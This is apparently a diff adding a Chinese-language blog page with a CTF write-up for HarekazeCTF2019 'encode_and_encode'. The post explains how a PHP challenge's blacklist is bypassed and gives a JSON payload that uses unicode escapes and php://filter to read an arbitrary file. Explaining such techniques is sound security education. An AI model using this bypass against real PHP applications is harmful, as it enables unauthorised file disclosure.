@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[HarekazeCTF2019]encode_and_encode | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[HarekazeCTF2019]encode_and_encode</h2>
+            <div class="post-date">2020-02-10</div>
+            
+            <div class="post-content">
+              <p>进去就三个链接。<br>
+<img src="https://guokeya.github.io/post-images/1581319850698.png" alt="" loading="lazy"></p>
+<!-- more -->
+<p>第三个连接有源码<br>
+<img src="https://guokeya.github.io/post-images/1581319873628.png" alt="" loading="lazy"><br>
+程序流程就是。</p>
+<pre><code>1。json_decode(POST的数据)，第二个参数True表示返回数组
+2。进入is_valid检验黑名单字符串。并且POST的数据中要有page参数
+3。取page参数。通过file_get_contents读取。返回结果为$contents
+4。is_valid判断返回结果是否有黑名单中的字符串。
+5。最后输出结果
+</code></pre>
+<p>首先。既然第一步要json_decode。那么我们就要POST一个json格式的数据<code>{&quot;xxx&quot;:&quot;xxx&quot;}</code><br>
+第3步中。要求json数据中。要有page参数。<code>{&quot;page&quot;:&quot;xxx&quot;}</code><br>
+接下来就是绕过is_valid。这里is_valid匹配了两次。一次是POST数据。第二次是返回结果<br>
+json_decode支持unicode编码。可以用unicode编码绕过第一次匹配。<br>
+并且file_get_contents支持伪协议。可以用php://filter绕过第二个判断<br>
+payload如下：</p>
+<pre><code>\u0070\u0068\u0070==php
+\u0066\u006c\u0061\u0067==flag
+{&quot;page&quot; : &quot;\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1581326066174.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/ciscn2019-hua-bei-sai-qu-day1-web5cyberpunk/">
+                  <h3 class="post-title">
+                    [CISCN2019 华北赛区 Day1 Web5]CyberPunk
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
